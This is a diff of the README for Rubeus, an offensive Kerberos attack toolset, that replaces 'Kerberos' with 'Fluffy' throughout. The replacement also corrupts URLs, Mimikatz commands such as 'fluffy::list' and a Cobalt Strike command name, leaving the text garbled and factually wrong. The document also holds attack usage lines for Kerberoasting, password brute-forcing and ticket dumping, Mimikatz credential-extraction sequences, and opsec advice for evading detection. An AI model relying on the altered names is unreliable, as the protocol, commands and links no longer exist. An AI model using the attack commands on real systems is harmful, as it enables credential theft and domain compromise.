@@ -2,17 +2,17 @@
 
 ----
 
-Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.
+Rubeus is a C# toolset for raw Fluffy interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.
 
 [Charlie Clark](https://twitter.com/exploitph) and [Ceri Coburn](https://twitter.com/_EthicalChaos_) have both made _significant_ contributions as co-developers to the Rubeus codebase. [Elad Shamir](https://twitter.com/elad_shamir) contributed some essential work for resource-based constrained delegation. Their work is very appreciated!
 
 Rubeus also uses a C# ASN.1 parsing/encoding library from [Thomas Pornin](https://github.com/pornin) named [DDer](https://github.com/pornin/DDer) that was released with an "MIT-like" license. Huge thanks to Thomas for his clean and stable code!
 
-PKINIT code heavily adapted from [@SteveSyfuhs](https://twitter.com/SteveSyfuhs)'s [Bruce](https://github.com/dotnet/Kerberos.NET) tool. Bruce made RFC4556 (PKINIT) a lot easier to understand. Huge thanks to Steve!
+PKINIT code heavily adapted from [@SteveSyfuhs](https://twitter.com/SteveSyfuhs)'s [Bruce](https://github.com/dotnet/Fluffy.NET) tool. Bruce made RFC4556 (PKINIT) a lot easier to understand. Huge thanks to Steve!
 
-NDR encoding and decoding for Kerberos PAC is based on the [NtApiDotNet](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet) library from [@tiraniddo](https://twitter.com/tiraniddo), thank you James.
+NDR encoding and decoding for Fluffy PAC is based on the [NtApiDotNet](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet) library from [@tiraniddo](https://twitter.com/tiraniddo), thank you James.
 
-The [KerberosRequestorSecurityToken.GetRequest](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method for Kerberoasting was contributed to PowerView (and then incorporated into Rubeus) by [@machosec](https://twitter.com/machosec).
+The [FluffyRequestorSecurityToken.GetRequest](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.fluffyrequestorsecuritytoken.getrequest(v=vs.110).aspx) method for Fluffyroasting was contributed to PowerView (and then incorporated into Rubeus) by [@machosec](https://twitter.com/machosec).
 
 [@harmj0y](https://twitter.com/harmj0y) is the primary author of this code base.
 
@@ -52,8 +52,8 @@ Rubeus is licensed under the BSD 3-Clause license.
     - [monitor](#monitor)
     - [harvest](#harvest)
   - [Roasting](#roasting)
-    - [kerberoast](#kerberoast)
-      - [kerberoasting opsec](#kerberoasting-opsec)
+    - [fluffyroast](#fluffyroast)
+      - [fluffyroasting opsec](#fluffyroasting-opsec)
       - [Examples](#examples)
     - [asreproast](#asreproast)
   - [Miscellaneous](#miscellaneous)
@@ -115,7 +115,7 @@ Rubeus is licensed under the BSD 3-Clause license.
        Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
             Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
 	
-	Retrieve a service ticket using the Kerberos Key List Request options:
+	Retrieve a service ticket using the Fluffy Key List Request options:
         	Rubeus.exe asktgs /keyList /service:KRBTGT_SPN </ticket:BASE64 | /ticket:FILE.KIRBI> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
 
 	Retrieve a delegated managed service account ticket:
@@ -124,7 +124,7 @@ Rubeus is licensed under the BSD 3-Clause license.
         Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
             Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
 
-        Perform a Kerberos-based password bruteforcing attack:
+        Perform a Fluffy-based password bruteforcing attack:
             Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
 
         Perform a scan for account that do not require pre-authentication:
@@ -203,7 +203,7 @@ Rubeus is licensed under the BSD 3-Clause license.
         Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
             Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]
 
-        Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
+        Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Fluffy GSS-API, faking delegation:
             Rubeus.exe tgtdeleg [/target:SPN]
 
         Monitor every /interval SECONDS (default 60) for new TGTs:
@@ -215,50 +215,50 @@ Rubeus is licensed under the BSD 3-Clause license.
 
      Roasting:
 
-        Perform Kerberoasting:
-            Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
+        Perform Fluffyroasting:
+            Rubeus.exe fluffyroast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
-        Perform Kerberoasting, outputting hashes to a file:
-            Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]
+        Perform Fluffyroasting, outputting hashes to a file:
+            Rubeus.exe fluffyroast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]
 
-        Perform Kerberoasting, outputting hashes in the file output format, but to the console:
-            Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
+        Perform Fluffyroasting, outputting hashes in the file output format, but to the console:
+            Rubeus.exe fluffyroast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
-        Perform Kerberoasting with alternate credentials:
-            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
+        Perform Fluffyroasting with alternate credentials:
+            Rubeus.exe fluffyroast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
-        Perform Kerberoasting with an existing TGT:
-            Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
+        Perform Fluffyroasting with an existing TGT:
+            Rubeus.exe fluffyroast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
 
-        Perform Kerberoasting with an existing TGT using an enterprise principal:
-            Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
+        Perform Fluffyroasting with an existing TGT using an enterprise principal:
+            Rubeus.exe fluffyroast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
 
-        Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
-            Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]
+        Perform Fluffyroasting with an existing TGT and automatically retry with the enterprise principal if any fail:
+            Rubeus.exe fluffyroast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]
 
-        Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
-            Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]
+        Perform Fluffyroasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
+            Rubeus.exe fluffyroast /usetgtdeleg [/ldaps] [/nowrap]
 
-        Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
-            Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]
+        Perform "opsec" Fluffyroasting, using tgtdeleg, and filtering out AES-enabled accounts:
+            Rubeus.exe fluffyroast /rc4opsec [/ldaps] [/nowrap]
 
-        List statistics about found Kerberoastable accounts without actually sending ticket requests:
-            Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]
+        List statistics about found Fluffyroastable accounts without actually sending ticket requests:
+            Rubeus.exe fluffyroast /stats [/ldaps] [/nowrap]
 
-        Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
-            Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]
+        Perform Fluffyroasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
+            Rubeus.exe fluffyroast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]
 
-        Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
-            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]
+        Perform Fluffyroasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
+            Rubeus.exe fluffyroast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]
 
-        Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
-            Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]
+        Perform Fluffyroasting, with a delay of 5000 milliseconds and a jitter of 30%:
+            Rubeus.exe fluffyroast /delay:5000 /jitter:30 [/ldaps] [/nowrap]
 
-        Perform AES Kerberoasting:
-            Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
+        Perform AES Fluffyroasting:
+            Rubeus.exe fluffyroast /aes [/ldaps] [/nowrap]
 
-        Perform Kerberoasting using an account without pre-auth by sending AS-REQ's:
-            Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> /nopreauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]
+        Perform Fluffyroasting using an account without pre-auth by sending AS-REQ's:
+            Rubeus.exe fluffyroast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> /nopreauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]
 
         Perform AS-REP "roasting" for any users without preauth:
             Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/des] [/nowrap]
@@ -317,9 +317,9 @@ This section covers some notes on the operational security of using Rubeus in an
 
 Any action you perform on a system is a detectable risk, especially when abusing functionality in "weird"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating _"everything is stealthy until someone is looking for it"_ - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in [Matt Graeber](https://twitter.com/mattifestation) and [Lee Christensen](https://twitter.com/tifkin_)’s Black Hat USA 2018 [“Subverting Sysmon”](https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf) talk and associated [whitepaper](https://specterops.io/assets/resources/Subverting_Sysmon.pdf).
 
-From the host perspective, Rubeus can be caught during initial [weaponization](#weaponization) of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4\_hmac use in tickets in a modern environment).
+From the host perspective, Rubeus can be caught during initial [weaponization](#weaponization) of the code itself, by an abnormal (non-lsass.exe) process issuing raw Fluffy port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4\_hmac use in tickets in a modern environment).
 
-From a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4\_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4\_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256\_cts\_hmac\_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as "encryption downgrade".
+From a network or domain controller log perspective, since Rubeus implements many parts of the normal Fluffy protocol, the main detection method involves the use of rc4\_hmac in Fluffy exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Fluffy exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4\_hmac (NTLM) hash is used in a Fluffy exchange instead of a aes256\_cts\_hmac\_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Fluffy traffic is parsed), and domain controller event log level, sometimes known as "encryption downgrade".
 
 #### Weaponization
 
@@ -331,16 +331,16 @@ Also, AMSI (the Antimalware Scan Interface) has been [added to .NET 4.8](https:/
 
 Say we have elevated access on a machine and want to extract user credentials for reuse.
 
-Mimikatz is the swiss army knife of credential extraction, with multiple options. The `sekurlsa::logonpasswords` command will open up a [read handle to LSASS](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168), enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. **Sidenote**: the `sekurlsa::ekeys` command will enumerate ALL key types present for the Kerberos package.
+Mimikatz is the swiss army knife of credential extraction, with multiple options. The `sekurlsa::logonpasswords` command will open up a [read handle to LSASS](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168), enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. **Sidenote**: the `sekurlsa::ekeys` command will enumerate ALL key types present for the Fluffy package.
 
-Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the **tgtdeleg** command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a [GetSystem](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107) equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.
+Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Fluffy tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the **tgtdeleg** command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a [GetSystem](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107) equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.
 
 Mimikatz can perform the same base64 .kirbi extraction with the following series of commands:
 
     mimikatz # privilege::debug
     mimikatz # token::elevate
     mimikatz # standard::base64 /output:true
-    mimikatz # kerberos::list /export
+    mimikatz # fluffy::list /export
 
 Mimikatz can also carve tickets directly out of LSASS' memory with:
 
@@ -354,19 +354,19 @@ As "everything is stealthy until someone is looking for it", it's arguable wheth
 
 Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access. 
 
-**Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their ["Abusing Microsoft Kerberos - Sorry you guys don't get it"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).
+**Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Fluffy at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their ["Abusing Microsoft Fluffy - Sorry you guys don't get it"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-fluffy-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).
 
 Let's compare "over-passing-the-hash" via Mimikatz' `sekurlsa::pth` command verus using the `asktgt` command from Rubeus (or [Kekeo](https://github.com/gentilkiwi/kekeo/) if you'd like).
 
-When `sekurlsa::pth` is used to over-pass-the-hash, Mimikatz first creates a new [logon type 9 process](https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926) with dummy credentials - this creates a new "sacrificial" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then [patched into the appropriate section](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600) for the associated logon session (in this case, the "sacrificial" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.
+When `sekurlsa::pth` is used to over-pass-the-hash, Mimikatz first creates a new [logon type 9 process](https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926) with dummy credentials - this creates a new "sacrificial" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then [patched into the appropriate section](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_fluffy.c#L566-L600) for the associated logon session (in this case, the "sacrificial" logon session that was started). This causes the normal Fluffy authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.
 
-When Rubeus' `asktgt` command is run (or Kekeo's equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the `/ptt` flag is passed.
+When Rubeus' `asktgt` command is run (or Kekeo's equivalent), the raw Fluffy protocol is used to request a TGT, which is then applied to the current logon session if the `/ptt` flag is passed.
 
-With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with `/ptt`), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the `/createnetonly` command to create a sacrificial process/logon session, then using `/ptt /ticket:X /luid:0xa..` with the newly created process LUID. If using Cobalt Strike, using the **make\_token** command with dummy credentials and then **kerberos\_ticket\_use** with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.
+With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with `/ptt`), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the `/createnetonly` command to create a sacrificial process/logon session, then using `/ptt /ticket:X /luid:0xa..` with the newly created process LUID. If using Cobalt Strike, using the **make\_token** command with dummy credentials and then **fluffy\_ticket\_use** with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.
 
-It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.
+It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Fluffy traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.
 
-**Sidenote**: one way _both_ approaches can potentially be caught is the previously mentioned "encryption downgrade" detection. To retrieve AES keys, use Mimikatz' `sekurlsa::ekeys` module to return ALL Kerberos encryption keys (same with `lsadump::dcsync`) which are better to use when trying to evade some detections.
+**Sidenote**: one way _both_ approaches can potentially be caught is the previously mentioned "encryption downgrade" detection. To retrieve AES keys, use Mimikatz' `sekurlsa::ekeys` module to return ALL Fluffy encryption keys (same with `lsadump::dcsync`) which are better to use when trying to evade some detections.
 
 
 ## Ticket requests and renewals
@@ -378,13 +378,13 @@ Breakdown of the ticket request commands:
 | [asktgt](#asktgt) | Request a ticket-granting-ticket (TGT) from a hash/key or password |
 | [asktgs](#asktgs) | Request a service ticket from a passed TGT |
 | [renew](#renew) | Renew (or autorenew) a TGT or service ticket |
-| [brute](#brute) | Perform a Kerberos-based password bruteforcing attack. 'spray' can also be used instead of 'brute' |
-| [preauthscan](#preauthscan) | Preform a scan for accounts that do not require Kerberos pre-authentication |
+| [brute](#brute) | Perform a Fluffy-based password bruteforcing attack. 'spray' can also be used instead of 'brute' |
+| [preauthscan](#preauthscan) | Preform a scan for accounts that do not require Fluffy pre-authentication |
 
 
 ### asktgt
 
-The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (`/rc4`, `/aes128`, `/aes256`, or `/des`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options. If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
+The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (`/rc4`, `/aes128`, `/aes256`, or `/des`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options. If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The `/ptt` flag will "pass-the-ticket" and apply the resulting Fluffy credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
 
 Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.
 
@@ -566,9 +566,9 @@ The `/printargs` flag will print the arguments required to forge a ticket with t
 
 Using a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the request is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy
 
-The `/keyList` flag was implemented for Kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). These requests must utilise a forged partial TGT from a read-only domain controller in the `/ticket:BASE64|FILE.KIRBI` parameter, further details on this forged TGT in the [golden](#golden) section. Furthermore, the `/spn:x` field must be set to the KRBTGT SPN within the domain, eg. KRBTBT/domain.local.
+The `/keyList` flag was implemented for Fluffy [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). These requests must utilise a forged partial TGT from a read-only domain controller in the `/ticket:BASE64|FILE.KIRBI` parameter, further details on this forged TGT in the [golden](#golden) section. Furthermore, the `/spn:x` field must be set to the KRBTGT SPN within the domain, eg. KRBTBT/domain.local.
 
-The **asktgs** action also supports requesting service tickets via the Kerberos authentication package using LSASS. This mode of operation can be enabled by omitting the `/ticket` argument. By default, the TGT associated with the current logon session is used.  An alternative logon session can be targetted by supplying the `/luid:xxx` argument.  Local administrator privileges are required when targetting other logon sessions. Currently, only simple service tickets can be requested via LSASS.  Arguments for features such as S4U2Self, U2U, key list and KDC proxy are ingnored.  Requesting service tickets via LSASS can often be more opsec friendly, since Kerberos traffic will originate from LSASS.  This mode is also required for scenarios where Credential Guard / Remote Credential Guard is active, since dumping TGT's with credential guard is not possible.      
+The **asktgs** action also supports requesting service tickets via the Fluffy authentication package using LSASS. This mode of operation can be enabled by omitting the `/ticket` argument. By default, the TGT associated with the current logon session is used.  An alternative logon session can be targetted by supplying the `/luid:xxx` argument.  Local administrator privileges are required when targetting other logon sessions. Currently, only simple service tickets can be requested via LSASS.  Arguments for features such as S4U2Self, U2U, key list and KDC proxy are ingnored.  Requesting service tickets via LSASS can often be more opsec friendly, since Fluffy traffic will originate from LSASS.  This mode is also required for scenarios where Credential Guard / Remote Credential Guard is active, since dumping TGT's with credential guard is not possible.      
 
 Requesting a TGT for dfm.a and then using that ticket to request a service ticket for the "LDAP/primary.testlab.local" and "cifs/primary.testlab.local" SPNs:
 
@@ -650,7 +650,7 @@ Requesting a TGT for dfm.a and then using that ticket to request a service ticke
     v1.3.3
 
 
-    [*] Action: List Kerberos Tickets (Current User)
+    [*] Action: List Fluffy Tickets (Current User)
 
         [0] - 0x12 - aes256_cts_hmac_sha1
         Start/End/MaxRenew: 2/10/2019 6:44:43 PM ; 2/10/2019 11:44:09 PM ; 2/17/2019 6:44:09 PM
@@ -1019,7 +1019,7 @@ Rubeus.exe asktgs /service:krbtgt/ghostpack.local /luid:0x3e7
 
 ### renew
 
